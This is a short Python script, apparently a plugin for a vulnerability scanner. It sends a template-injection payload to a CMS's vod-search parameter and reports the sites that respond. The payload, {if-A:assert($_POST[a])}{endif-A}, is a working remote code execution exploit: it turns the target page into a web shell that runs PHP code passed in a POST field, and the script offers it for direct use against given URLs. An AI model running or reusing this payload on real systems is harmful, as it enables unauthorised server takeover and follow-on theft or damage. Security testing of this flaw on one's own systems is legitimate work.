#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/index.php?m=vod-search&wd=%7bif-A%3aassert(%24_POST%5ba%5d)%7d%7bendif-A%7d"
bug ="共0条数据&nbsp"
info = '/index.php?m=vod-search&wd={if-A:assert($_POST[a])}{endif-A}'
re ='<a href="(.*?)?m=[\s\S]*?'

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info)#,StrRe(res[0],re));


main()
